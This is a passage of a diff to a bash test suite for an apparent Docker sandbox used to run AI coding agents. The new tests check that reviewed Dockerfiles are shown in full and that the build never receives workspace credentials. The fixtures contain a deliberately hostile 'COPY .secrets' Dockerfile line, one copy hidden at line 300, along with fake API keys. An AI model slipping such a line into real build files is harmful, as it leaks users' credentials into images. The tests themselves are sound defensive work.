@@ -3120,6 +3120,8 @@ _PA_SCRIPT="$(cd "$(dirname "$0")/.." && pwd)/sandy"
 _PA_FN="$(awk '
     /^sha256\(\)/ {print; next}
     /^_sandy_context_hash\(\)/,/^}/ {print; next}
+    /^_sandy_df_session_record\(\)/,/^}/ {print; next}
+    /^_sandy_note_session_created_sandy_dir\(\)/,/^}/ {print; next}
     /^_sandy_project_dockerfile_approved\(\)/,/^}/ {print; next}
 ' "$_PA_SCRIPT")"
 # Compute the context hash exactly as sandy does (drift-proof — calls the real fn).
@@ -11841,8 +11843,10 @@ _S114_CONV_COUNT="$(sed -n "${_S114_FMT_LINE}p" "$_S114_SANDY" | grep -o '%[sd]'
 # constant. The tripwire went DOWN again, same as the 2.2.0 removal noted
 # above: an equality catches a forgotten argument drop exactly as it catches
 # a forgotten add.
-check "§114(13g) marker printf format/arg count line up (18 %s/%d conversions)" \
-    test "$_S114_CONV_COUNT" -eq 18
+# 19 as of 2.7.0: `image` (#295) -- which image the launch ran, one
+# pre-composed object passed as ONE argument (name/id/project_layer), additive.
+check "§114(13g) marker printf format/arg count line up (19 %s/%d conversions)" \
+    test "$_S114_CONV_COUNT" -eq 19
 
 # (14) sandy-handoff-sessions helper: REMOVED in 2.6.0 (#382, decision 7) along
 # with the helper itself; the pane-identity contract it was built on stays
@@ -18390,6 +18394,8 @@ PY
 _S162_FN="$(awk '
     /^sha256\(\)/ {print; next}
     /^_sandy_context_hash\(\)/,/^}/ {print; next}
+    /^_sandy_df_session_record\(\)/,/^}/ {print; next}
+    /^_sandy_note_session_created_sandy_dir\(\)/,/^}/ {print; next}
     /^_sandy_project_dockerfile_approved\(\)/,/^}/ {print; next}
 ' "$_S162_SANDY")"
 _s162_mk() {   # $1 = fixture name; a workspace with a .sandy/Dockerfile and a stub docker
@@ -18488,11 +18494,145 @@ check "§162(14) the prompt carries a reading rule, not just the risk (#295 item
 # Item 6 is structural: exercising it for real means running the whole launch
 # up to Phase 3 with a docker that fails only the project build.
 check "§162(15) a failed project build names the probe scope -- sandy's own hosts only (mutation: a bare docker build under set -e fails with no hint and reads like a sandy fault)" \
-    bash -c 'grep -F -A12 -e "-f \"\$PROJECT_DOCKERFILE\" \"\$WORK_DIR/.sandy\" || _sandy_proj_build_rc=\$?" "$1" | grep -q "covers only its OWN build hosts"' _ "$_S162_SANDY"
+    bash -c 'grep -F -A12 -e "-f \"\$_sandy_proj_ctx/Dockerfile\" \"\$_sandy_proj_ctx\" || _sandy_proj_build_rc=\$?" "$1" | grep -q "covers only its OWN build hosts"' _ "$_S162_SANDY"
+
+# --- C (#295, R8): the review shows the WHOLE Dockerfile, and the build is sent
+# exactly what the approval hashed -- never .sandy/config or .sandy/.secrets.
+# The two gaps composed: the review stopped at line 200 while the context hash
+# excluded config/.secrets yet docker was handed the raw .sandy/ dir, so a
+# `COPY .secrets` below line 200 was approved unseen and baked the workspace's
+# credentials into an image layer.
+_S162_ST="$(awk '/^_sandy_stage_project_context\(\) \{/,/^}$/' "$_S162_SANDY")"
+check "§162(16-pre) extracted _sandy_stage_project_context (mutation: a rename empties it and must fail HERE)" \
+    bash -c 'printf "%s" "$1" | grep -q "_sandy_context_hash \"\$ctx\" --list"' _ "$_S162_ST"
+_s162_mk F
+{ printf 'ARG BASE_IMAGE\nFROM $BASE_IMAGE\n'
+  _s162_i=3; while [ "$_s162_i" -lt 300 ]; do printf 'RUN echo line-%s\n' "$_s162_i"; _s162_i=$((_s162_i + 1)); done
+  printf 'COPY .secrets /TAIL-LINE-300\n'; } > "$_S162_DIR/F/ws/.sandy/Dockerfile"
+printf 'SECRET=1\n' > "$_S162_DIR/F/ws/.sandy/.secrets"
+_S162_OUT="$(_s162_sup F "")"
+check "§162(16) the review prints line 300 of a 300-line Dockerfile, says how many lines there are, and never truncates (mutation: restoring sed -n 1,200p hides exactly the line that matters)" \
+    bash -c 'printf "%s" "$1" | grep -q "| COPY .secrets /TAIL-LINE-300" && printf "%s" "$1" | grep -q "all 300 lines" && ! printf "%s" "$1" | grep -q "truncated"' _ "$_S162_OUT"
+check "§162(17) ...and says config/.secrets are NOT sent to the build, when the workspace has them" \
+    bash -c 'printf "%s" "$1" | grep -q "NOT sent to the build"' _ "$_S162_OUT"
+printf 'FROM x\nRUN true\nCOPY . /no-trailing-newline' > "$_S162_DIR/F/ws/.sandy/Dockerfile"
+_S162_OUT="$(_s162_sup F "")"
+check "§162(18) a last line with no trailing newline is still shown (read loop keeps a partial final line)" \
+    bash -c 'printf "%s" "$1" | grep -q "| COPY . /no-trailing-newline" && printf "%s" "$1" | grep -q "all 3 lines"' _ "$_S162_OUT"
+
+# Staging, driven through the REAL helper and the REAL hash.
+_s162_ctx() {   # $1 = dir; a context with every kind of file the rules distinguish
+    mkdir -p "$1/sub"
+    printf 'FROM x\nCOPY helper.sh sub/config /\n' > "$1/Dockerfile"
+    printf 'echo hi\n' > "$1/helper.sh"
+    printf 'nested helper that is really a build input\n' > "$1/sub/config"
+    printf 'SANDY_MODEL=x\n' > "$1/config"
+    printf 'ANTHROPIC_API_KEY=sk-secret\n' > "$1/.secrets"
+}
+_s162_stage() {   # $1 ctx  $2 expected hash  $3 TMPDIR -> stdout of the helper, then RC=<n>
+    TMPDIR="$3" bash -c "$_S162_FN"$'\n'"$_S162_ST"$'\n''_sandy_stage_project_context "$1" "$2"; echo "RC=$?"' _ "$1" "$2" 2>/dev/null
+}
+_S162_G="$_S162_DIR/G"; mkdir -p "$_S162_G/tmp"; _s162_ctx "$_S162_G/ctx"
+_S162_HG="$(_s162_hash "$_S162_G/ctx")"
+_S162_OUT="$(_s162_stage "$_S162_G/ctx" "$_S162_HG" "$_S162_G/tmp")"
+_S162_STG="$(printf '%s\n' "$_S162_OUT" | sed -n '1p')"
+check "§162(19) the staged context carries every build input -- Dockerfile, helper.sh, and a NESTED file named config (got: $(cd "$_S162_STG" 2>/dev/null && find . -type f | LC_ALL=C sort | tr '\n' ' '))" \
+    bash -c 'printf "%s" "$1" | grep -q "RC=0" && [ -f "$2/Dockerfile" ] && [ -f "$2/helper.sh" ] && [ -f "$2/sub/config" ]' _ "$_S162_OUT" "$_S162_STG"
+check "§162(20) ...and NEITHER top-level config nor .secrets (mutation: staging the raw dir, or copying them, puts credentials in reach of a COPY)" \
+    bash -c '[ -d "$1" ] && [ ! -e "$1/.secrets" ] && [ ! -e "$1/config" ]' _ "$_S162_STG"
+check "§162(21) what is staged hashes to exactly what the gate approved -- one file set, not two enumerations" \
+    test "$(_s162_hash "$_S162_STG")" = "$_S162_HG"
+rm -rf "$_S162_STG"
+printf 'edited after approval\n' >> "$_S162_G/ctx/helper.sh"
+_S162_OUT="$(_s162_stage "$_S162_G/ctx" "$_S162_HG" "$_S162_G/tmp")"
+check "§162(22) a context edited after its approval is NOT staged, and nothing is left behind in TMPDIR (mutation: dropping the hash re-check builds bytes nobody reviewed)" \
+    bash -c 'printf "%s" "$1" | grep -q "RC=1" && [ -z "$(ls -A "$2")" ]' _ "$_S162_OUT" "$_S162_G/tmp"
+_S162_OUT="$(_s162_stage "$_S162_G/ctx" "" "$_S162_G/tmp")"
+check "§162(23) ...nor with no recorded approval hash at all (an empty hash never matches)" \
+    bash -c 'printf "%s" "$1" | grep -q "RC=1" && [ -z "$(ls -A "$2")" ]' _ "$_S162_OUT" "$_S162_G/tmp"
+_S162_H="$_S162_DIR/H"; mkdir -p "$_S162_H/tmp" "$_S162_H/ctx"; printf 'FROM x\n' > "$_S162_H/real"
+ln -s "$_S162_H/real" "$_S162_H/ctx/Dockerfile"
+_S162_OUT="$(_s162_stage "$_S162_H/ctx" "$(_s162_hash "$_S162_H/ctx")" "$_S162_H/tmp")"
+check "§162(24) a SYMLINKED .sandy/Dockerfile is refused -- the hash (-type f) never covered its content, so its target could change after approval and still build" \
+    bash -c 'printf "%s" "$1" | grep -q "RC=1" && [ -z "$(ls -A "$2")" ]' _ "$_S162_OUT" "$_S162_H/tmp"
+
+# The hash itself: which edits re-prompt.
+_S162_H0="$(_s162_hash "$_S162_G/ctx")"
+printf 'SANDY_MODEL=y\n' > "$_S162_G/ctx/config"; printf 'ANTHROPIC_API_KEY=sk-other\n' > "$_S162_G/ctx/.secrets"
+check "§162(25) editing the top-level config or .secrets does NOT change the approval hash (routine credential edits must not re-prompt)" \
+    test "$(_s162_hash "$_S162_G/ctx")" = "$_S162_H0"
+printf 'changed\n' >> "$_S162_G/ctx/sub/config"
+check "§162(26) editing a NESTED file named config DOES change it -- it is a build input docker is sent (mutation: the old '! -name config' skipped it at any depth, so a RUN could execute it unreviewed)" \
+    test "$(_s162_hash "$_S162_G/ctx")" != "$_S162_H0"
+
+# The launch path: the REAL Phase 3 block hands docker the staged dir.
+_S162_P3="$_S162_DIR/phase3.sh"
+python3 - "$_S162_SANDY" "$_S162_P3" <<'S162_EXTRACT'
+import sys
+s = open(sys.argv[1]).read()
+i = s.index('PROJECT_DOCKERFILE="$WORK_DIR/.sandy/Dockerfile"\n')
+j = s.index('\n# --- Platform already detected', i)
+open(sys.argv[2], 'w').write(s[i:j] + '\n')
+S162_EXTRACT
+_S162_P="$_S162_DIR/P"; mkdir -p "$_S162_P/sb" "$_S162_P/tmp"; _s162_ctx "$_S162_P/ws/.sandy"
+# docker stub: records -f and the context argument of `docker build`, and what
+# that context held WHILE the build ran; everything else succeeds.
+cat > "$_S162_P/docker" <<'S162_DOCKER'
+#!/usr/bin/env bash
+if [ "$1" = build ]; then
+    f=""; last=""; prev=""
+    for a in "$@"; do [ "$prev" = "-f" ] && f="$a"; prev="$a"; last="$a"; done
+    { echo "F=$f"; echo "CTX=$last"; ( cd "$last" && find . -type f | LC_ALL=C sort ); } > "$S162_LOG"
+fi
+exit 0
+S162_DOCKER
+chmod +x "$_S162_P/docker"
+_S162_OUT="$(
+    trap - ERR
+    set +e
+    S162_LOG="$_S162_P/build.log"; export S162_LOG
+    PATH="$_S162_P:$PATH"; TMPDIR="$_S162_P/tmp"
+    WORK_DIR="$_S162_P/ws"; SANDBOX_DIR="$_S162_P/sb"; SANDBOX_NAME=p-deadbeef; IMAGE_NAME=sandy-claude-code
+    NEEDS_BUILD=false; SKILLS_REBUILT=false
+    info() { :; }; warn() { :; }; error() { echo "ERROR: $*"; }
+    _sandy_build_allowed() { return 0; }
+    eval "$_S162_FN"; eval "$_S162_ST"
+    _sandy_project_dockerfile_approved() { _SANDY_DF_HASH="$(_sandy_context_hash "$(dirname "$1")")"; return 0; }
+    ( . "$_S162_P3" ) 2>&1
+    echo "RC=$?"
+)"
+check "§162(27) the launch builds from a STAGED copy, not the workspace's .sandy/ (got: $(tr '\n' ' ' < "$_S162_P/build.log" 2>/dev/null))" \
+    bash -c 'c="$(sed -n "s/^CTX=//p" "$1")"; f="$(sed -n "s/^F=//p" "$1")"; [ -n "$c" ] && [ "$c" != "$2" ] && [ "$f" = "$c/Dockerfile" ] && printf "%s" "$3" | grep -q "RC=0"' \
+    _ "$_S162_P/build.log" "$_S162_P/ws/.sandy" "$_S162_OUT"
+check "§162(28) ...which, while docker read it, held the build inputs and NOT .secrets or config (mutation: building \"\$WORK_DIR/.sandy\" sends both)" \
+    bash -c 'grep -qx "./Dockerfile" "$1" && grep -qx "./sub/config" "$1" && ! grep -qx "./.secrets" "$1" && ! grep -qx "./config" "$1"' _ "$_S162_P/build.log"
+check "§162(29) ...and the staged copy is removed after the build" \
+    bash -c '[ -z "$(ls -A "$1")" ]' _ "$_S162_P/tmp"
+
+# Real docker, where there is one: the property as the user would meet it. The
+# positive control builds the same Dockerfile from the RAW dir -- the pre-fix
+# behaviour -- and must succeed, or the negative proves nothing.
+if docker info >/dev/null 2>&1; then
+    _S162_R="$_S162_DIR/R"; mkdir -p "$_S162_R/ctx" "$_S162_R/tmp"
+    printf 'FROM scratch\nCOPY .secrets /baked-in\n' > "$_S162_R/ctx/Dockerfile"
+    printf 'ANTHROPIC_API_KEY=sk-secret\n' > "$_S162_R/ctx/.secrets"
+    _S162_RSTG="$(_s162_stage "$_S162_R/ctx" "$(_s162_hash "$_S162_R/ctx")" "$_S162_R/tmp" | sed -n '1p')"
+    _S162_RAW=0; docker build -q --no-cache -t sandy-s162-probe:raw "$_S162_R/ctx" >/dev/null 2>&1 || _S162_RAW=$?
+    _S162_STGRC=0; docker build -q --no-cache -t sandy-s162-probe:staged -f "$_S162_RSTG/Dockerfile" "$_S162_RSTG" >/dev/null 2>&1 || _S162_STGRC=$?
+    docker rmi sandy-s162-probe:raw sandy-s162-probe:staged >/dev/null 2>&1 || true
+    check "§162(30) positive control: the raw .sandy/ dir DOES let \`COPY .secrets\` bake the secret into a layer (rc $_S162_RAW)" \
+        test "$_S162_RAW" -eq 0
+    check "§162(31) the staged context makes that same Dockerfile FAIL to build -- the secret cannot reach a layer (rc $_S162_STGRC)" \
+        test "$_S162_STGRC" -ne 0
+    rm -rf "$_S162_RSTG"
+else
+    skip "§162(30-31) docker not reachable -- the real-build check of the staged context did not run"
+fi
 
 rm -rf "$_S162_DIR"
 unset _S162_SANDY _S162_DIR _S162_FN _S162_OUT _S162_RC _S162_HA _S162_HB _S162_HD
-unset -f _s162_mk _s162_pre _s162_hash _s162_approval _s162_diag _s162_sup
+unset _S162_ST _S162_G _S162_HG _S162_STG _S162_H _S162_H0 _S162_P3 _S162_P _S162_R _S162_RSTG _S162_RAW _S162_STGRC _s162_i
+unset -f _s162_mk _s162_pre _s162_hash _s162_approval _s162_diag _s162_sup _s162_ctx _s162_stage
 echo "§165: SANDY_EXTRA_ENV name lists compose — host, approved workspace and env are unioned (#388)"
 # ============================================================
 # Last-wins used to replace the host list with the workspace one (and an env
@@ -18720,7 +18860,7 @@ _S167_NONE="$(trap - ERR; _s167_run build_codex_cmd "")"
 check "§167(3) no SANDY_EFFORT -> no override: codex keeps its own default (got: $_S167_NONE)" \
     bash -c 'case "$1" in "ARGV:"*reasoning*) exit 1 ;; "ARGV:"*) exit 0 ;; esac; exit 1' _ "$_S167_NONE"
 _S167_GEM="$(trap - ERR; _s167_run build_gemini_cmd high)"
-check "§167(4) gemini does not receive it -- no effort surface sandy drives (got: $_S167_GEM)" \
+check "§167(4) gemini's ARGV carries no effort flag -- it has none; since 2.7.0 its surface is a read-only system settings file, checked in §184 (got: $_S167_GEM)" \
     bash -c 'case "$1" in "ARGV:"*effort*) exit 1 ;; "ARGV:"*) exit 0 ;; esac; exit 1' _ "$_S167_GEM"
 # The sink is `bash -c`. Host-side validation already rejects anything but the
 # five levels, but the builder must be safe on its own (R1): an unvalidated
@@ -18740,8 +18880,8 @@ check "§167(6) the validation block and _sandy_agent_has were extracted (mutati
     bash -c 'printf "%s" "$1" | grep -q "Invalid SANDY_EFFORT" && test -n "$2"' _ "$_S167_VAL" "$_S167_HAS"
 check "§167(7) a codex-only launch KEEPS SANDY_EFFORT (it used to be cleared, so codex ran unpinned and the marker said null)" \
     bash -c 'printf "%s\n" "$1" | grep -qx "rc=0 effort=max"' _ "$(_s167_val codex max)"
-check "§167(8) a gemini-only launch clears it and SAYS so (it applies to claude and codex only)" \
-    bash -c 'printf "%s\n" "$1" | grep -qx "rc=0 effort=" && printf "%s\n" "$1" | grep -q "INFO SANDY_EFFORT=high ignored"' _ "$(_s167_val gemini high)"
+check "§167(8) an opencode-only launch clears it and SAYS so (opencode has no effort surface sandy drives; gemini gained one in 2.7.0, §184)" \
+    bash -c 'printf "%s\n" "$1" | grep -qx "rc=0 effort=" && printf "%s\n" "$1" | grep -q "INFO SANDY_EFFORT=high ignored"' _ "$(_s167_val opencode high)"
 check "§167(9) a codex launch still fails loud on an invalid level" \
     bash -c 'printf "%s\n" "$1" | grep -q "ERR Invalid SANDY_EFFORT" && printf "%s\n" "$1" | grep -qx "rc=1"' _ "$(_s167_val codex extreme)"
 check "§167(10) claude-only is unchanged: kept" \
@@ -21813,7 +21953,9 @@ _H="$(_s177_home codex)";  _s177_write_marker "$_H/sandboxes/sb-codex" codex uns
 _S177_OUT_CODEX="$(_s177_state "$_H")"
 check "§177(2a) a claude launch's marker reads back as marker.state=present with the writer's own version" \
     bash -c 'printf "%s" "$1" | grep -qF "\"marker\":{\"state\":\"present\",\"sandy_version\":\"9.9.9-test\","' -- "$_S177_OUT_CLAUDE"
-for _s177_f in agents agent_args agent_args_composed feature_entries; do
+# `image` (#295, 2.7.0) joined the list: docker-cannot-answer is id:null
+# INSIDE the object, so the field itself is never a deliberate null.
+for _s177_f in agents image agent_args agent_args_composed feature_entries; do
     check "§177(2b) INVARIANT: the current writer never leaves $_s177_f null (claude launch) -- a null here would read as 'predates the field'" \
         bash -c 'printf "%s" "$1" | grep -q "\"$2\":" && ! printf "%s" "$1" | grep -q "\"$2\":null"' -- "$_S177_OUT_CLAUDE" "$_s177_f"
     check "§177(2b) INVARIANT: ...nor $_s177_f on a codex-only launch" \
@@ -21903,6 +22045,1444 @@ unset _S177_TREE _S177_TOPS _S177_MISS _s177_t
 rm -rf "$_S177_D"
 unset _S177_SANDY _S177_D _S177_MNT _S177_SPEC_CONTRACT _S177_WRITER _S177_FEBODY _S177_OUT_CLAUDE _S177_OUT_CODEX _S177_OUT_PRE _S177_OUT_OK _S177_OUT_LIGHT _H _s177_f
 unset -f _s177_pairs _s177_write_marker _s177_state _s177_home _s177_csi_case 2>/dev/null || true
+
+
+# ============================================================
+echo "§178: #299 — --update-sessions judges the proxy sidecar too; the proxy image carries its identity"
+# ============================================================
+# --update-sessions enumerates sandy.daemon=true containers, which are the
+# AGENT containers only — the proxy sidecar is never daemon-labelled. Before
+# #299 a proxy image that moved on its own (monthly freshness epoch, a proxy/
+# source change, a Go stdlib fix) while the agent image stood still left every
+# live session on the old sidecar indefinitely: the agent read "current" and
+# the session was skipped. Asserted end to end through the REAL dispatcher and
+# REAL --build-only children behind a stub docker (the §71 pattern), with
+# three fixture sessions, each in its own workspace:
+#   P — fresh agent, STALE proxy   -> must restart, reason naming the proxy
+#   F — fresh agent, fresh proxy   -> skip (current)
+#   N — fresh agent; the container that answers to sandy-proxy-<session> is an
+#       AGENT image running a stale sha (the workspace-named-`proxy` trap: an
+#       agent can carry a sandy-proxy-* name) -> NOT this session's proxy,
+#       skip (current). Agent-vs-proxy is decided by image, never by name.
+# The egress proxy is left ON (the default posture) so the children really
+# build it: a comparison against a proxy image the refresh step never rebuilt
+# would be meaningless.
+_S178_BIN="$(cd "$(mktemp -d)" && pwd -P)"
+_S178_HOME="$(cd "$(mktemp -d)" && pwd -P)"
+_S178_WSP="$(cd "$(mktemp -d)" && pwd -P)"
+_S178_WSF="$(cd "$(mktemp -d)" && pwd -P)"
+_S178_WSN="$(cd "$(mktemp -d)" && pwd -P)"
+_S178_CALLS="$(mktemp)"
+: > "$_S178_CALLS"
+export _S178_WSP _S178_WSF _S178_WSN _S178_CALLS
+cat > "$_S178_BIN/docker" <<'DOCKERSHIM'
+#!/usr/bin/env bash
+echo "$*" >> "$_S178_CALLS"
+case "$1" in
+    info) exit 0 ;;
+    ps)
+        printf 'agentP111|P-session|%s|sandy-claude-code\n' "$_S178_WSP"
+        printf 'agentF222|F-session|%s|sandy-claude-code\n' "$_S178_WSF"
+        printf 'agentN333|N-session|%s|sandy-claude-code\n' "$_S178_WSN"
+        exit 0
+        ;;
+    inspect)
+        shift
+        fmt="" tgt="" typ=""
+        while [ $# -gt 0 ]; do
+            case "$1" in
+                -f) shift; fmt="$1" ;;
+                --type) shift; typ="$1" ;;
+                *) tgt="$1" ;;
+            esac
+            shift
+        done
+        case "$fmt" in
+            '{{.Id}}|{{.Config.Image}}')
+                # Only a TYPED container lookup answers — an untyped inspect
+                # could resolve an image or network sharing the name.
+                [ "$typ" = "container" ] || exit 1
+                case "$tgt" in
+                    sandy-proxy-P-session) echo "proxyP111|sandy-proxy" ;;
+                    sandy-proxy-F-session) echo "proxyF222|sandy-proxy" ;;
+                    sandy-proxy-N-session) echo "agentNX444|sandy-claude-code" ;;
+                    *) exit 1 ;;
+                esac
+                ;;
+            '{{.Image}}|{{.Config.Image}}')
+                case "$tgt" in
+                    agentP111|agentF222|agentN333) echo "sha256:current-sandy-claude-code|sandy-claude-code" ;;
+                    proxyP111)  echo "sha256:old|sandy-proxy" ;;
+                    proxyF222)  echo "sha256:current-sandy-proxy|sandy-proxy" ;;
+                    agentNX444) echo "sha256:old|sandy-claude-code" ;;
+                    *) exit 1 ;;
+                esac
+                ;;
+        esac
+        exit 0
+        ;;
+    image)
+        case "$2" in
+            inspect)
+                shift 2
+                fmt="" name=""
+                while [ $# -gt 0 ]; do
+                    case "$1" in
+                        -f) shift; fmt="$1" ;;
+                        *) name="$1" ;;
+                    esac
+                    shift
+                done
+                [ -n "$fmt" ] && echo "sha256:current-$name"
+                exit 0
+                ;;
+            *) exit 0 ;;
+        esac
+        ;;
+    build) exit 0 ;;
+    run) exit 1 ;;
+    network) exit 0 ;;
+    *) exit 0 ;;
+esac
+DOCKERSHIM
+chmod +x "$_S178_BIN/docker"
+# curl succeeds with an empty body: the #218 build-reachability probe passes
+# (so a proxy rebuild is really attempted, not deferred), and every version
+# check reads "no newer version" (no spurious agent rebuild).
+printf '#!/usr/bin/env bash\nexit 0\n' > "$_S178_BIN/curl"
+chmod +x "$_S178_BIN/curl"
+
+# Prime the shared build cache once, so the per-session children no-op.
+# SANDY_PROXY_REF/GITHUB_HEAD_REF are cleared here and in the refresh below:
+# (7)-(9) assert the LOCAL-checkout identity (`# proxy-src:`), and PR CI's
+# ambient GITHUB_HEAD_REF forces the clone path, which has no content hash.
+(cd "$_S178_WSP" && PATH="$_S178_BIN:$PATH" SANDY_HOME="$_S178_HOME" \
+    SANDY_PROXY_REF="" GITHUB_HEAD_REF= \
+    SANDY_AUTO_APPROVE_PRIVILEGED=1 bash "$SANDY_SCRIPT" --build-only) >/dev/null 2>&1 \
+    && _S178_PRIME_RC=0 || _S178_PRIME_RC=$?
+check "§178(0) fixture: priming --build-only (proxy on) succeeds" test "$_S178_PRIME_RC" -eq 0
+
+# Move the proxy's build input so --update-sessions' own refresh step has to
+# rebuild it (what a new freshness epoch or a proxy/ edit does).
+rm -f "$_S178_HOME/.build_hash_proxy"
+: > "$_S178_CALLS"
+_S178_OUT="$(mktemp)"
+PATH="$_S178_BIN:$PATH" SANDY_HOME="$_S178_HOME" SANDY_AUTO_APPROVE_PRIVILEGED=1 \
+    SANDY_PROXY_REF="" GITHUB_HEAD_REF= \
+    bash "$SANDY_SCRIPT" --update-sessions --dry-run >"$_S178_OUT" 2>&1 \
+    && _S178_RC=0 || _S178_RC=$?
+check "§178(1) --update-sessions --dry-run exits 0" test "$_S178_RC" -eq 0
+check "§178(2) the refresh step REBUILDS the proxy image (a staleness comparison against a proxy nothing rebuilt would be meaningless) (mutation: gate the proxy phase off under --build-only -> no sandy-proxy build in the call log)" \
+    bash -c 'grep -E "^build " "$1" | grep -q -- "-t sandy-proxy "' -- "$_S178_CALLS"
+check "§178(3) a fresh agent beside a STALE proxy is planned for restart, and the reason names the proxy (mutation: drop the _sandy_update_proxy_stale branch -> P reads skip (current))" \
+    bash -c 'grep "^P-session " "$1" | grep -qF "restart (proxy stale)"' -- "$_S178_OUT"
+check "§178(4) a fresh agent beside a fresh proxy is NOT restarted (mutation: treat any present proxy as stale -> F restarts)" \
+    bash -c 'grep "^F-session " "$1" | grep -qF "skip (current)"' -- "$_S178_OUT"
+check "§178(5) an AGENT-imaged container answering to sandy-proxy-<session> is not taken for the session proxy (mutation: drop the image gate in _sandy_update_proxy_stale -> its stale sha restarts N)" \
+    bash -c 'grep "^N-session " "$1" | grep -qF "skip (current)"' -- "$_S178_OUT"
+check "§178(6) the restart count is exactly the one stale-proxy session" \
+    bash -c 'grep -qF "(1 restart candidate(s))" "$1"' -- "$_S178_OUT"
+rm -f "$_S178_OUT"
+
+# --- (7)-(12) identity labels on the proxy image (#299 item 1) -------------
+# The generated Dockerfile.proxy already records two content-derived
+# identities as comments (`# freshness-epoch:` and, on the local-checkout
+# path, `# proxy-src:`). The build now stamps the SAME values as image labels
+# (a sidecar container inherits them). Asserted against the Dockerfile the
+# build actually used, so a label computed differently from the build input
+# fails -- not merely a label that is absent. The build line under test is the
+# one the --update-sessions refresh above really ran.
+_S178_BUILD="$(grep -E '^build ' "$_S178_CALLS" | grep -- '-t sandy-proxy ' | tail -n 1 || true)"
+_S178_DF_SRC="$(sed -n 's/^# proxy-src: \([0-9a-f]*\) .*/\1/p' "$_S178_HOME/Dockerfile.proxy")"
+_S178_DF_EPOCH="$(sed -n 's/^# freshness-epoch: \([^ ]*\) .*/\1/p' "$_S178_HOME/Dockerfile.proxy")"
+check "§178(7) the proxy build line and both Dockerfile identities were read (mutation: a reworded comment empties them and (8)/(9) go vacuous)" \
+    bash -c '[ -n "$1" ] && [ "${#2}" -eq 64 ] && [ -n "$3" ]' -- "$_S178_BUILD" "$_S178_DF_SRC" "$_S178_DF_EPOCH"
+check "§178(8) the proxy image is labelled sandy.proxy_src=sha256:<the Dockerfile proxy-src hash> (mutation: drop the label, or hash the source differently -> no exact token)" \
+    bash -c 'printf " %s \n" "$1" | grep -qF -- " --label sandy.proxy_src=sha256:$2 "' -- "$_S178_BUILD" "$_S178_DF_SRC"
+check "§178(9) the proxy image is labelled sandy.proxy_epoch=<the Dockerfile freshness epoch>, a YYYY-MM month (mutation: drop the label, or recompute the epoch in another format)" \
+    bash -c 'printf " %s \n" "$1" | grep -qF -- " --label sandy.proxy_epoch=$2 " && printf "%s" "$2" | grep -Eq "^[0-9]{4}-[0-9]{2}$"' -- "$_S178_BUILD" "$_S178_DF_EPOCH"
+
+# The clone path (installed single-file copies; forced by SANDY_PROXY_REF) has
+# no content hash -- its identity is the git ref, recorded as `git:<ref>`.
+rm -f "$_S178_HOME/.build_hash_proxy"
+: > "$_S178_CALLS"
+(cd "$_S178_WSP" && PATH="$_S178_BIN:$PATH" SANDY_HOME="$_S178_HOME" SANDY_PROXY_REF=v9.8.7 \
+    SANDY_AUTO_APPROVE_PRIVILEGED=1 bash "$SANDY_SCRIPT" --build-only) >/dev/null 2>&1 \
+    && _S178_RC=0 || _S178_RC=$?
+_S178_BUILD="$(grep -E '^build ' "$_S178_CALLS" | grep -- '-t sandy-proxy ' | tail -n 1 || true)"
+check "§178(10) clone path: the source label is git:<the ref the Dockerfile pins> (mutation: label the clone path with an empty or unprefixed value)" \
+    bash -c '[ "$1" -eq 0 ] && grep -qF "ARG SANDY_PROXY_REF=v9.8.7" "$3" && printf " %s \n" "$2" | grep -qF -- " --label sandy.proxy_src=git:v9.8.7 "' -- "$_S178_RC" "$_S178_BUILD" "$_S178_HOME/Dockerfile.proxy"
+
+# --print-state full mode reports them, additively, beside proxy_image_created.
+# One stub, one mode per case, each in its OWN empty $SANDY_HOME (§88b).
+cat > "$_S178_BIN/docker" <<'DOCKERSHIM'
+#!/usr/bin/env bash
+[ "${S178_PX:-}" = unreachable ] && exit 1
+case "$1 ${2:-}" in
+    "image inspect")
+        case "$*" in
+            *Created*sandy-proxy*)
+                case "${S178_PX:-}" in
+                    labels)   echo '2026-09-01T00:00:00Z|sha256:0123abcd|2026-09' ;;
+                    nolabels) echo '2026-09-01T00:00:00Z|' ;;
+                    novalue)  echo '2026-09-01T00:00:00Z|<no value>|<no value>' ;;
+                    *) exit 1 ;;
+                esac
+                ;;
+        esac
+        exit 0
+        ;;
+esac
+exit 0
+DOCKERSHIM
+chmod +x "$_S178_BIN/docker"
+_s178_state() {  # $1 S178_PX mode, $2 print-state mode arg ("" = full) -> JSON on stdout; stderr to $_S178_ERR
+    local _h; _h="$(cd "$(mktemp -d)" && pwd -P)"
+    PATH="$_S178_BIN:$PATH" SANDY_HOME="$_h" S178_PX="$1" bash "$SANDY_SCRIPT" --print-state ${2:+"$2"} 2>"$_S178_ERR" || true
+    rm -rf "$_h"
+}
+_s178_px_fields() {  # $1 JSON, $2 expected created, $3 src, $4 epoch ("null" = JSON null); stderr file $5 must be empty
+    python3 - "$1" "$2" "$3" "$4" "$5" <<'PY'
+import json, os, sys
+doc, c, s, e, errf = sys.argv[1:6]
+d = json.loads(doc)
+assert os.path.getsize(errf) == 0, open(errf).read()
+want = lambda v: None if v == "null" else v
+assert d["proxy_image_created"] == want(c), d["proxy_image_created"]
+assert d["proxy_image_src"] == want(s), d["proxy_image_src"]
+assert d["proxy_image_epoch"] == want(e), d["proxy_image_epoch"]
+PY
+}
+_S178_ERR="$(mktemp)"
+_S178_J="$(_s178_state labels "")"
+check "§178(11a) full mode: a labelled proxy image reports proxy_image_src and proxy_image_epoch beside proxy_image_created; one JSON document, 0 bytes of stderr (mutation: drop the fields, or read the labels in a separate spawn that the stub does not answer)" \
+    _s178_px_fields "$_S178_J" 2026-09-01T00:00:00Z sha256:0123abcd 2026-09 "$_S178_ERR"
+_S178_J="$(_s178_state nolabels "")"
+check "§178(11b) full mode: an image with NO labels (built before #299) -> both fields null, date still reported (mutation: gate the src emission on the date instead of on the src -> an empty-string src instead of null)" \
+    _s178_px_fields "$_S178_J" 2026-09-01T00:00:00Z null null "$_S178_ERR"
+_S178_J="$(_s178_state novalue "")"
+check "§178(11c) full mode: a '<no value>' template answer is read as absent, never reported as a value" \
+    _s178_px_fields "$_S178_J" 2026-09-01T00:00:00Z null null "$_S178_ERR"
+_S178_J="$(_s178_state absent "")"
+check "§178(11d) full mode: no proxy image at all -> all three null" \
+    _s178_px_fields "$_S178_J" null null null "$_S178_ERR"
+_S178_J="$(_s178_state labels light)"
+check "§178(12a) light mode: both keys PRESENT and null (shape parity with proxy_image_created; no image inspect in the light budget)" \
+    _s178_px_fields "$_S178_J" null null null "$_S178_ERR"
+_S178_J="$(_s178_state unreachable "")"
+check "§178(12b) docker unreachable (full): both keys present and null" \
